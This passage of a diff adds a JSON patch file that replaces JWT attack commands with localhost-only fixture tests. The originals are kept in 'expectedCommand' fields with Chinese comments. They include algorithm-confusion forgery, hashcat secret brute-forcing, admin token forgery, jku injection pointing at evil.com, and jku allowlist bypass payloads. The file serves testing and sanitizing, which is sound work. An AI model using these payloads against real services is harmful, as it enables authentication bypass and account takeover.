hashlib.sha256).digest()).rstrip(b\"=\").decode()\nprint(header + \".\" + claims + \".\" + signature)\nPY\n# This historical confusion token is generated only from a temporary local public key; a modern verifier rejects it."
+        },
+        {
+          "area": "execution",
+          "index": 2,
+          "expectedCommand": "python3 jwt_tool.py {TOKEN} -X k -pk pubkey.pem\n\n# -X k = 密钥混淆攻击模式\n# -pk = 指定公钥文件\n# 工具自动完成RS256→HS256切换和签名",
+          "command": "python3 jwt_tool.py fixtures/payloader-rs256.jwt -X k -pk .payloader-jwt-fixture/public.pem\n# Owned local fixture only; modern validators should reject the generated confusion token."
+        },
+        {
+          "area": "execution",
+          "index": 3,
+          "expectedCommand": "# 如果支持jku/x5u头，可注入自定义JWKS端点\nHeader: {\n  \"alg\": \"RS256\",\n  \"typ\": \"JWT\",\n  \"jku\": \"https://evil.com/.well-known/jwks.json\"\n}\n\n# 在evil.com上托管攻击者生成的JWKS\n# 服务端会从攻击者URL获取公钥进行验证\nopenssl genrsa -out attacker_key.pem 2048\nopenssl rsa -in attacker_key.pem -pubout > attacker_pub.pem",
+          "command": "python3 - <<'PY'\nimport jwt, time, urllib.error, urllib.request\nprivate_key = open(\".payloader-jwt-fixture/private.pem\", \"rb\").read()\ntoken = jwt.encode(\n    {\"sub\":\"payloader-negative\",\"iss\":\"payloader-test\",\"aud\":\"payloader-api\",\"iat\":int(time.time()),\"exp\":int(time.time())+60},\n    private_key,\n    algorithm=\"RS256\",\n    headers={\"typ\":\"payloader+jwt\",\"kid\":\"PAYLOADER_LOCAL_KEY\",\"jku\":\"http://127.0.0.1:18080/jwks.json\"},\n)\nrequest = urllib.request.Request(\"http://127.0.0.1:8080/api/marker\", headers={\"Authorization\":\"Bearer \"+token})\ntry:\n    print(urllib.request.urlopen(request, timeout=5).status)\nexcept urllib.error.HTTPError as error:\n    print(error.code)\nPY\n# Expected: reject unless the exact localhost JKU is preconfigured for the test issuer; arbitrary token-supplied URLs are never followed."
+        },
+        {
+          "area": "wafBypass",
+          "index": 0,
+          "expectedCommand": "# PEM格式(标准)\n-----BEGIN PUBLIC KEY-----\nMIIBIjANBgkqh...\n-----END PUBLIC KEY-----\n\n# DER格式(二进制)\nopenssl rsa -pubin -in pubkey.pem -outform DER -out pubkey.der\n\n# 带/不带换行符\ncat pubkey.pem | tr -d \"\\n\" > pubkey_noline.pem\n\n# 不同编码的公钥作为HMAC密钥",
+          "command": "openssl pkey -pubin -in .payloader-jwt-fixture/public.pem -text -noout\nopenssl pkey -pubin -in .payloader-jwt-fixture/public.pem -outform DER -out .payloader-jwt-fixture/public.der\nopenssl dgst -sha256 .payloader-jwt-fixture/public.pem .payloader-jwt-fixture/public.der\n# Format differences are measured on one local public key and are never treated as separate trusted keys."
+        }
+      ]
+    },
+    {
+      "id": "jwt-secret-bruteforce",
+      "patches": [
+        {
+          "area": "execution",
+          "index": 0,
+          "expectedCommand": "# 解码JWT Header\necho \"eyJhbGciOiJIUzI1NiJ9\" | base64 -d\n# {\"alg\":\"HS256\"}\n\n# 确认是HMAC对称算法才可爆破\n# HS256 / HS384 / HS512 = 可爆破\n# RS256 / ES256 = 不可直接爆破密钥",
+          "command": "python3 - <<'PY'\nimport base64, json\ntoken = \"eyJhbGciOiJIUzI1NiIsInR5cCI6InBheWxvYWRlcitqd3QifQ.eyJzdWIiOiJwYXlsb2FkZXItdXNlciIsImlzcyI6InBheWxvYWRlci10ZXN0IiwiYXVkIjoicGF5bG9hZGVyLWFwaSJ9.PAYLOADER_TEST_SIGNATURE\"\nfor label, segment in zip((\"header\", \"payload\"), token.split(\".\")[:2]):\n    decoded = base64.urlsafe_b64decode(segment + \"=\" * (-len(segment) % 4))\n    print(label, json.loads(decoded))\nPY\n# Structure inspection does not verify the signature, issuer, audience, time, or token type."
+        },
+        {
+          "area": "execution",
+          "index": 1,
+          "expectedCommand": "# hashcat模式16500 = JWT\nhashcat -m 16500 -a 0 jwt.txt /usr/share/wordlists/rockyou.txt\n\n# jwt.txt内容为完整的JWT字符串\n# eyJhbGci....signature\n\n# 使用规则加速\nhashcat -m 16500 -a 0 jwt.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule\n\n# 掩码暴力破解(8位数字密钥)\nhashcat -m 16500 -a 3 jwt.txt ?d?d?d?d?d?d?d?d",
+          "command": "python3 - <<'PY'\nimport base64, hashlib, hmac\nmessage = b\"PAYLOADER_TEST_HEADER.PAYLOADER_TEST_PAYLOAD\"\napproved_secret = b\"PAYLOADER_TEST_HS256_SECRET_32_BYTES\"\nsignature = hmac.new(approved_secret, message, hashlib.sha256).digest()\ncandidates = [b\"PAYLOADER_WRONG_A\", b\"PAYLOADER_WRONG_B\", approved_secret]\nmatches = [candidate.decode() for candidate in candidates if hmac.compare_digest(hmac.new(candidate, message, hashlib.sha256).digest(), signature)]\nprint({\"candidate_count\": len(candidates), \"matches\": matches})\nPY\n# Fixed three-candidate owned-token audit; no masks, general wordlists, or production material."
+        },
+        {
+          "area": "execution",
+          "index": 2,
+          "expectedCommand": "python3 jwt_tool.py {TOKEN} -C -d /usr/share/wordlists/rockyou.txt\n\n# -C = 开启字典破解模式\n# -d = 指定字典文件\n# 也支持常见弱密钥快速测试\npython3 jwt_tool.py {TOKEN} -C -d common_jwt_secrets.txt",
+          "command": "printf \"%s\\n\" \"PAYLOADER_WRONG_A\" \"PAYLOADER_WRONG_B\" \"PAYLOADER_TEST_HS256_SECRET_32_BYTES\" > .payloader-jwt-approved-secrets.txt\npython3 jwt_tool.py fixtures/payloader-hs256.jwt -C -d .payloader-jwt-approved-secrets.txt\n# Exactly three approved candidates against one owned token; delete the file after the test."
+        },
+        {
+          "area": "execution",
+          "index": 3,
+          "expectedCommand": "import jwt\n\nsecret = \"cracked_secret_key\"\n\nforged = jwt.encode(\n    {\"user\": \"admin\", \"role\": \"superadmin\", \"exp\": 1999999999},\n    secret,\n    algorithm=\"HS256\"\n)\nprint(f\"Forged JWT: {forged}\")\n\n# 验证\ncurl -H \"Authorization: Bearer $FORGED_JWT\" \"https://{TARGET}/api/admin\"",
+          "command": "python3 - <<'PY'\nimport base64, hashlib, hmac, json, time, urllib.error, urllib.request\nencode = lambda value: base64.urlsafe_b64encode(json.dumps(value, separators=(\",\", \":\")).encode()).rstrip(b\"=\").decode()\nheader = encode({\"alg\":\"HS256\",\"typ\":\"payloader+jwt\",\"kid\":\"PAYLOADER_TEST_KEY\"})\npayload = encode({\"sub\":\"payloader-user\",\"iss\":\"payloader-test\",\"aud\":\"payloader-api\",\"iat\":int(time.time()),\"exp\":int(time.time())+60})\nsignature = base64.urlsafe_b64encode(hmac.new(b\"PAYLOADER_TEST_HS256_SECRET_32_BYTES\", (header+\".\"+payload).encode(), hashlib.sha256).digest()).rstrip(b\"=\").decode()\nrequest = urllib.request.Request(\"http://127.0.0.1:8080/api/marker\", headers={\"Authorization\":\"Bearer \"+header+\".\"+payload+\".\"+signature})\ntry:\n    print(urllib.request.urlopen(request, timeout=5).status)\nexcept urllib.error.HTTPError as error:\n    print(error.code)\nPY\n# This verifies only the fixed owned test key and read-only marker; no privilege claim is added."
+        },
+        {
+          "area": "wafBypass",
+          "index": 0,
+          "expectedCommand": "# 常见弱密钥列表\nsecret\npassword\n123456\nhs256-secret\njwt-secret\nmy-secret-key\nchangeme\ndefault\nqwerty\nsuper-secret\nyour-256-bit-secret\nsecretkey\ntoken-secret\napplication-secret",
+          "command": "printf \"%s\\n\" \"PAYLOADER_WRONG_A\" \"PAYLOADER_WRONG_B\" \"PAYLOADER_TEST_HS256_SECRET_32_BYTES\" > .payloader-jwt-approved-secrets.txt\nwc -l .payloader-jwt-approved-secrets.txt\nhashcat --potfile-disable --runtime=10 -m 16500 fixtures/payloader-hs256.jwt .payloader-jwt-approved-secrets.txt\n# Fixed three-entry dictionary and ten-second runtime cap; no mask or general password list."
+        }
+      ]
+    },
+    {
+      "id": "jwt-jku-x5u-injection",
+      "patches": [
+        {
+          "area": "execution",
+          "index": 0,
+          "expectedCommand": "# 解码JWT Header查看是否包含jku/x5u\necho \"{JWT_HEADER}\" | base64 -d | jq\n\n# 常见原始Header\n{\"alg\":\"RS256\",\"typ\":\"JWT\",\"jku\":\"https://target.com/.well-known/jwks.json\"}\n\n# 检查JWKS端点\ncurl -s \"https://{TARGET}/.well-known/jwks.json\" | jq\ncurl -s \"https://{TARGET}/.well-known/openid-configuration\" | jq .jwks_uri",
+          "command": "python3 - <<'PY'\nimport base64, json\ntoken = \"eyJhbGciOiJIUzI1NiIsInR5cCI6InBheWxvYWRlcitqd3QifQ.eyJzdWIiOiJwYXlsb2FkZXItdXNlciIsImlzcyI6InBheWxvYWRlci10ZXN0IiwiYXVkIjoicGF5bG9hZGVyLWFwaSJ9.PAYLOADER_TEST_SIGNATURE\"\nfor label, segment in zip((\"header\", \"payload\"), token.split(\".\")[:2]):\n    decoded = base64.urlsafe_b64decode(segment + \"=\" * (-len(segment) % 4))\n    print(label, json.loads(decoded))\nPY\n# Structure inspection does not verify the signature, issuer, audience, time, or token type."
+        },
+        {
+          "area": "execution",
+          "index": 1,
+          "expectedCommand": "from cryptography.hazmat.primitives.asymmetric import rsa\nfrom cryptography.hazmat.primitives import serialization\nimport json, base64\n\n# 生成RSA密钥对\nprivate_key = rsa.generate_private_key(public_exponent=65537, key_size=2048)\npublic_key = private_key.public_key()\n\n# 导出PEM格式\nwith open(\"attacker_private.pem\", \"wb\") as f:\n    f.write(private_key.private_bytes(\n        serialization.Encoding.PEM,\n        serialization.PrivateFormat.PKCS8,\n        serialization.NoEncryption()\n    ))\n\n# 生成JWKS格式公钥\nnumbers = public_key.public_numbers()\njwks = {\"keys\": [{\"kty\": \"RSA\", \"kid\": \"attacker-key-1\",\n    \"n\": base64.urlsafe_b64encode(numbers.n.to_bytes(256, \"big\")).rstrip(b\"=\").decode(),\n    \"e\": base64.urlsafe_b64encode(numbers.e.to_bytes(3, \"big\")).rstrip(b\"=\").decode(),\n    \"use\": \"sig\", \"alg\": \"RS256\"}]}\n\nwith open(\"jwks.json\", \"w\") as f:\n    json.dump(jwks, f)",
+          "command": "fixture_dir=\".payloader-jwt-fixture\"\nmkdir -p \"$fixture_dir\"\nopenssl genpkey -algorithm RSA -pkeyopt rsa_keygen_bits:2048 -out \"$fixture_dir/private.pem\"\nopenssl pkey -in \"$fixture_dir/private.pem\" -pubout -out \"$fixture_dir/public.pem\"\nopenssl pkey -pubin -in \"$fixture_dir/public.pem\" -outform DER | openssl dgst -sha256\n# Disposable local fixture only; remove the directory after the batch."
+        },
+        {
+          "area": "execution",
+          "index": 2,
+          "expectedCommand": "# 在攻击者服务器托管jwks.json\npython3 -m http.server 8080\n# http://evil.com:8080/jwks.json\n\nimport jwt\n\n# 用攻击者私钥签名\nwith open(\"attacker_private.pem\", \"rb\") as f:\n    attacker_key = f.read()\n\nforged = jwt.encode(\n    {\"user\": \"admin\", \"role\": \"admin\", \"exp\": 1999999999},\n    attacker_key,\n    algorithm=\"RS256\",\n    headers={\"jku\": \"http://evil.com:8080/jwks.json\", \"kid\": \"attacker-key-1\"}\n)\nprint(forged)",
+          "command": "python3 - <<'PY'\nimport base64, json\nfrom cryptography.hazmat.primitives import serialization\nkey = serialization.load_pem_public_key(open(\".payloader-jwt-fixture/public.pem\", \"rb\").read())\nnumbers = key.public_numbers()\nencode = lambda value: base64.urlsafe_b64encode(value).rstrip(b\"=\").decode()\nsize = (numbers.n.bit_length() + 7) // 8\njwk = {\"kty\":\"RSA\",\"use\":\"sig\",\"alg\":\"RS256\",\"kid\":\"PAYLOADER_LOCAL_KEY\",\"n\":encode(numbers.n.to_bytes(size,\"big\")),\"e\":encode(numbers.e.to_bytes((numbers.e.bit_length()+7)//8,\"big\"))}\nopen(\".payloader-jwt-fixture/jwks.json\",\"w\",encoding=\"utf-8\").write(json.dumps({\"keys\":[jwk]}))\nprint(jwk[\"kid\"])\nPY\n# Builds a localhost-only JWK Set from the disposable public key.\npython3 -m http.server 18080 --bind 127.0.0.1 --directory .payloader-jwt-fixture > .payloader-jwt-fixture/server.log 2>&1 &\nserver_pid=$!\ntrap 'kill \"$server_pid\" 2>/dev/null' EXIT\ncurl -sS --max-time 5 http://127.0.0.1:18080/jwks.json\nkill \"$server_pid\"\nwait \"$server_pid\" 2>/dev/null || true\ntrap - EXIT\n# One bounded localhost fetch proves the fixture; no remote key URL is contacted."
+        },
+        {
+          "area": "execution",
+          "index": 3,
+          "expectedCommand": "curl -s -H \"Authorization: Bearer {FORGED_JWT}\" \\\n  \"https://{TARGET}/api/admin/users\" | jq\n\n# 服务端流程：\n# 1. 解析JWT Header中的jku URL\n# 2. 从evil.com获取JWKS公钥\n# 3. 用攻击者公钥验证签名——通过!\n# 4. 信任Payload中的admin身份",
+          "command": "python3 - <<'PY'\nimport jwt, time, urllib.error, urllib.request\nprivate_key = open(\".payloader-jwt-fixture/private.pem\", \"rb\").read()\ntoken = jwt.encode(\n    {\"sub\":\"payloader-negative\",\"iss\":\"payloader-test\",\"aud\":\"payloader-api\",\"iat\":int(time.time()),\"exp\":int(time.time())+60},\n    private_key,\n    algorithm=\"RS256\",\n    headers={\"typ\":\"payloader+jwt\",\"kid\":\"PAYLOADER_LOCAL_KEY\",\"jku\":\"http://127.0.0.1:18080/jwks.json\"},\n)\nrequest = urllib.request.Request(\"http://127.0.0.1:8080/api/marker\", headers={\"Authorization\":\"Bearer \"+token})\ntry:\n    print(urllib.request.urlopen(request, timeout=5).status)\nexcept urllib.error.HTTPError as error:\n    print(error.code)\nPY\n# Expected: reject unless the exact localhost JKU is preconfigured for the test issuer; arbitrary token-supplied URLs are never followed."
+        },
+        {
+          "area": "wafBypass",
+          "index": 0,
+          "expectedCommand": "# 开放重定向绕过域名白名单\n{\"jku\": \"https://target.com/redirect?url=https://evil.com/jwks.json\"}\n\n# 子域名接管\n{\"jku\": \"https://abandoned.target.com/.well-known/jwks.json\"}\n\n# URL混淆\n{\"jku\": \"https://target.com@evil.com/jwks.json\"}\n{\"jku\": \"https://evil.com#target.com/jwks.json\"}\n{\"jku\": \"https://evil.com/.well-known/jwks.json?.target.com\"}",
+          "command": "python3 - <<'PY'\nimport base64, subprocess, time, urllib.error, urllib.request\nimport jwt\nsubprocess.run([\"openssl\",\"req\",\"-x509\",\"-new\",\"-key\",\".payloader-jwt-fixture/private.pem\",\"-out\",\".payloader-jwt-fixture/test-cert.pem\",\"-days\",\"1\",\"-subj\",\"/CN=payloader-local\"], check=True)\nprivate_key = open(\".payloader-jwt-fixture/private.pem\", \"rb\").read()\ntoken = jwt.encode(\n    {\"sub\":\"payloader-negative\",\"iss\":\"payloader-test\",\"aud\":\"payloader-api\",\"iat\":int(time.time()),\"exp\":int(time.time())+60},\n    private_key,\n    algorithm=\"RS256\",\n    headers={\"typ\":\"payloader+jwt\",\"kid\":\"PAYLOADER_LOCAL_KEY\",\"x5u\":\"http://127.0.0.1:18080/test-cert.pem\"},\n)\nrequest = urllib.request.Request(\"http://127.0.0.1:8080/api/marker\", headers={\"Authorization\":\"Bearer \"+token})\ntry:\n    print(urllib.request.urlopen(request, timeout=5).status)\nexcept urllib.error.HTTPError as error:\n    print(error.code)\nPY\n# Expected: reject unless the exact local X5U and certificate chain are preconfigured and trusted for the issuer."
+        }
+      ]
+    }
+  ]
+}
